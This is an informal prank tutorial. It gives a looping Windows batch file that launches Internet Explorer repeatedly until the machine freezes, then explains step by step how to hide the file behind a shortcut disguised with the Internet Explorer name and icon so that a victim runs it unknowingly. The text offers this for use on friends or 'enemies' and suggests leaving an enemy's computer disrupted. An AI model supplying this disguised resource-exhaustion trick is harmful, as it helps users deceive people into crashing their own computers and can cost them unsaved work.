Just copy the following into notepad and save it as "fun.bat" or whatever you want but it has to be .bat as the file extension and under "save as type" choose "All Files". You will be able to tell if you did it right or not because after you have saved the file, when you look at the file it will look like a little window with a cog in the middle of it.  @echo off :start start iexplore.exe goto start  What that simple code does is start internet explorer over and over and over again until the computer freezes up or the user cancels the batch file.  But, someone won't just click on it just for the fun of it, or maybe they will depending if your friends are like Curious George or not. What you have to do is make this batch file look like a program that the person uses a lot(so they have more of a chance to fall to the prank). How you do this is you take the batch file and hide it somwhere on the computer where you will remember where it is and they will not find it. Next, right click on the batch file and choose "Create Shortcut" which will create a shortcut to the file. Now rename the shortcut to "Internet Explorer". Now take the shortcut and put it onto the desktop or wherever the victim usualy clicks to get to Internet Explorer. Move the old Internet Explorer icon(the one that actualy takes you to Internet Explorer to a safe place, maybe the same place you but the origional batch file). Now, right click on the shortcut to the batch file and choose "properties", when the properties window comes up choose "change icon" and then you can change the icon of the shortcut to the Internet Explorer icon.  YOUR DONE! Now you can just wait and laugh when your friend, or enemy goes to get onto the internet and their computer freezes because so many windows pop up.  Once the fun is done be a friend and put everything back to normal. Or, if they are the enemy, leave it like that and watch that little vain in the person's head pulse in anger. Dont snicker to loud or they might figure it all out.
